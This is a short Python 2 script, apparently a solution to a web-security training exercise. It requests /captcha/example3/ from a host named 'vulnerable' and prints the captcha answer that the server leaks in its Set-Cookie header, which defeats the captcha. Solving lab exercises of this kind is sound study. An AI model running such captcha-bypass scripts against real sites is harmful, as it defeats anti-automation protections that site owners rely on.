import httplib, re

if __name__ == '__main__':
    conn = httplib.HTTPConnection('vulnerable')
    conn.request('GET', '/captcha/example3/')
    res = conn.getresponse()
    print re.findall(r'captcha=(.*)', res.getheader('set-cookie'))[0]
